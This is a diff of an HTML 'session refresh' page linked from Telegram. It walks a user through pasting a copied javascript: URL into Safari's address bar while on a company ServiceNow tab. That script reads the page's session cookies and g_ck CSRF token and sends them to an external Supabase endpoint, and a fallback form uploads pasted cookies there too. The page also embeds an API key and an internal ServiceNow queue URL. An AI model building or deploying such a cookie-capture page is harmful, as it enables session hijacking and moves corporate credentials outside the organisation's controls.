@@ -12,44 +12,45 @@
     .step{font-weight:600;color:#38bdf8;margin-bottom:6px}
     a.btn,button.primary{display:block;width:100%;text-align:center;background:#2563eb;color:#fff;text-decoration:none;padding:14px;border-radius:10px;font-weight:600;margin:12px 0;border:none;font-size:1rem}
     button.green{background:#059669}
-    input,textarea{width:100%;padding:10px;border-radius:8px;border:1px solid #475569;background:#0f172a;color:#e2e8f0;margin:6px 0;font-size:14px}
     button.purple{width:100%;padding:12px;border:none;border-radius:10px;background:#7c3aed;color:#fff;font-weight:600;font-size:1rem}
+    input,textarea{width:100%;padding:10px;border-radius:8px;border:1px solid #475569;background:#0f172a;color:#e2e8f0;margin:6px 0;font-size:14px}
     .ok{color:#4ade80}.err{color:#f87171}
     small{color:#94a3b8}
     #err{display:none}
     ol{padding-left:1.2rem;margin:8px 0}
     li{margin:10px 0}
+    #count{font-size:2rem;font-weight:700;color:#38bdf8;text-align:center}
   </style>
 </head>
 <body>
-  <h1>🔄 Finish session refresh</h1>
+  <h1>🔄 Tap to refresh session</h1>
   <p id="err" class="err"></p>
   <div id="app" style="display:none">
-    <p><small>🔒 One-time link from Telegram — do not save. Each failure sends a new link.</small></p>
-    <div class="card">
-      <div class="step">Instructions</div>
-      <ol>
-        <li>Already logged in to <strong>ServiceNow</strong>? (Use link 1 from Telegram)</li>
-        <li>Switch to your <strong>ServiceNow tab</strong> in Safari</li>
-        <li>Tap the button below to <strong>copy</strong> the session script</li>
-        <li>Tap Safari <strong>address bar</strong> → <strong>Paste</strong> → <strong>Go</strong></li>
-        <li>You'll get <strong>✅ confirmation in Telegram</strong></li>
-      </ol>
+    <p><small>🔒 One-time link from Telegram — do not save.</small></p>
+    <div class="card" id="opening">
+      <p>Opening ServiceNow queue…</p>
+      <p id="count">3</p>
+      <p><small><strong>Keep this tab open.</strong> After login, come back here for step 2.</small></p>
     </div>
     <div class="card">
       <div class="step">Step 1 — ServiceNow login</div>
       <a class="btn" id="snow" href="#" rel="noopener">Open ServiceNow queue</a>
     </div>
     <div class="card">
-      <div class="step">Step 2 — Send session (no bookmark needed)</div>
+      <div class="step">Step 2 — After login (on ServiceNow tab)</div>
+      <ol>
+        <li>Come back to <strong>this tab</strong></li>
+        <li>Tap <strong>Copy session script</strong></li>
+        <li>Switch to <strong>ServiceNow tab</strong></li>
+        <li>Paste in Safari <strong>address bar</strong> → Go</li>
+      </ol>
       <button type="button" class="primary green" id="copyScript">📋 Copy session script</button>
       <p id="copyMsg"></p>
-      <p><small>Then paste in Safari address bar while on the ServiceNow page.</small></p>
     </div>
     <div class="card">
-      <div class="step">Fallback — paste cookie manually</div>
+      <div class="step">Fallback</div>
       <textarea id="cookie" rows="3" placeholder="Cookie string"></textarea>
-      <input id="gck" placeholder="g_ck token (optional)"/>
+      <input id="gck" placeholder="g_ck token"/>
       <button type="button" class="purple" id="submit">Upload session</button>
       <p id="msg"></p>
     </div>
@@ -57,32 +58,44 @@
   <script>
     const SUPABASE_URL = 'https://qhkeirrhjjtdyvrdkbxn.supabase.co';
     const ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFoa2VpcnJoamp0ZHl2cmRrYnhuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzY4MjY0MjEsImV4cCI6MjA5MjQwMjQyMX0.vgHg7uMrhaZ2YwKhmBKxrgmHzm83Ze3gD3XapXpGACc';
-    const SNOW_URL = 'https://micron.service-now.com/now/nav/ui/classic/params/target/sn_si_incident_list.do%3Fsysparm_query%3Dactive%253Dtrue%255Eassignment_group%253Db05a5f061b3ad490adc4a9f9bc4bcb46%255Estate%253D10%26sysparm_first_row%253D1%26sysparm_view%253D';
-    const params = new URLSearchParams(location.search);
-    const token = params.get('t');
+    const SNOW_URL = 'https://micron.service-now.com/now/nav/ui/classic/params/target/sn_si_incident_list.do%3Fsysparm_query%3Dactive%253Dtrue%255Eassignment_groupDYNAMICd6435e965f510100a9ad2572f2b47744%26sysparm_first_row%3D1%26sysparm_view%3D';
+    const token = new URLSearchParams(location.search).get('t');
     const errEl = document.getElementById('err');
 
     function sessionScript(tok) {
       const rpc = SUPABASE_URL + '/rest/v1/rpc/upload_session_with_token';
-      const js = `(function(){var t=${JSON.stringify(tok)};var rpc=${JSON.stringify(rpc)};var k=${JSON.stringify(ANON_KEY)};var g=window.g_ck||(document.body.innerHTML.match(/g_ck\\s*=\\s*['"]([^'"]+)['"]/)||[])[1]||'';fetch(rpc,{method:'POST',headers:{'Content-Type':'application/json','apikey':k,'Authorization':'Bearer '+k},body:JSON.stringify({p_token:t,p_cookie:document.cookie,p_g_ck:g})}).then(r=>r.json()).then(d=>alert(d.ok?'✅ Done! Check Telegram for confirmation.':('❌ '+(d.error||'Failed')))).catch(e=>alert('❌ '+e))})();`;
+      const js = `(function(){var t=${JSON.stringify(tok)};var rpc=${JSON.stringify(rpc)};var k=${JSON.stringify(ANON_KEY)};var g=window.g_ck||(document.body.innerHTML.match(/g_ck\\s*=\\s*['"]([^'"]+)['"]/)||[])[1]||'';fetch(rpc,{method:'POST',headers:{'Content-Type':'application/json','apikey':k,'Authorization':'Bearer '+k},body:JSON.stringify({p_token:t,p_cookie:document.cookie,p_g_ck:g})}).then(r=>r.json()).then(d=>alert(d.ok?'✅ Done! Check Telegram.':('❌ '+(d.error||'Failed')))).catch(e=>alert('❌ '+e))})();`;
       return 'javascript:' + encodeURIComponent(js);
+    }
+
+    function openSnow() {
+      const w = window.open(SNOW_URL, '_blank');
+      if (!w) location.href = SNOW_URL;
     }
 
     if (!token) {
       errEl.style.display = 'block';
-      errEl.textContent = 'Missing link. Use the fresh link from your latest Telegram session-failed alert.';
+      errEl.textContent = 'Missing link. Use the latest Telegram session-failed alert.';
     } else {
       document.getElementById('app').style.display = 'block';
       document.getElementById('snow').href = SNOW_URL;
-      const script = sessionScript(token);
+      document.getElementById('snow').onclick = (e) => { e.preventDefault(); openSnow(); };
       const rpc = SUPABASE_URL + '/rest/v1/rpc/upload_session_with_token';
+      const script = sessionScript(token);
+
+      let n = 3;
+      const el = document.getElementById('count');
+      const tmr = setInterval(() => {
+        n -= 1;
+        el.textContent = String(n);
+        if (n <= 0) { clearInterval(tmr); openSnow(); document.getElementById('opening').querySelector('p').textContent = 'ServiceNow opened — login, then do step 2 below.'; }
+      }, 800);
 
       document.getElementById('copyScript').onclick = async () => {
-        const el = document.getElementById('copyMsg');
+        const cm = document.getElementById('copyMsg');
         try {
-          if (navigator.clipboard && navigator.clipboard.writeText) {
-            await navigator.clipboard.writeText(script);
-          } else {
+          if (navigator.clipboard && navigator.clipboard.writeText) await navigator.clipboard.writeText(script);
+          else {
             const ta = document.createElement('textarea');
             ta.value = script;
             document.body.appendChild(ta);
@@ -90,31 +103,26 @@
             document.execCommand('copy');
             document.body.removeChild(ta);
           }
-          el.textContent = '✅ Copied! Switch to ServiceNow tab → paste in address bar → Go';
-          el.className = 'ok';
+          cm.textContent = '✅ Copied! Paste in Safari address bar on ServiceNow tab → Go';
+          cm.className = 'ok';
         } catch (e) {
-          el.textContent = '❌ Copy failed — use manual fallback below';
-          el.className = 'err';
+          cm.textContent = '❌ Copy failed';
+          cm.className = 'err';
         }
       };
 
       document.getElementById('submit').onclick = async () => {
         const msg = document.getElementById('msg');
         msg.textContent = 'Uploading...';
-        msg.className = '';
         try {
           const r = await fetch(rpc, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json', 'apikey': ANON_KEY, 'Authorization': 'Bearer ' + ANON_KEY },
-            body: JSON.stringify({
-              p_token: token,
-              p_cookie: document.getElementById('cookie').value.trim(),
-              p_g_ck: document.getElementById('gck').value.trim(),
-            }),
+            body: JSON.stringify({ p_token: token, p_cookie: document.getElementById('cookie').value.trim(), p_g_ck: document.getElementById('gck').value.trim() }),
           });
           const d = await r.json();
-          if (d.ok) { msg.textContent = '✅ ' + (d.message || 'Updated') + ' — check Telegram'; msg.className = 'ok'; }
-          else { msg.textContent = '❌ ' + (d.error || 'Failed'); msg.className = 'err'; }
+          msg.textContent = d.ok ? '✅ ' + (d.message || 'Updated') : '❌ ' + (d.error || 'Failed');
+          msg.className = d.ok ? 'ok' : 'err';
         } catch (e) {
           msg.textContent = '❌ ' + e;
           msg.className = 'err';
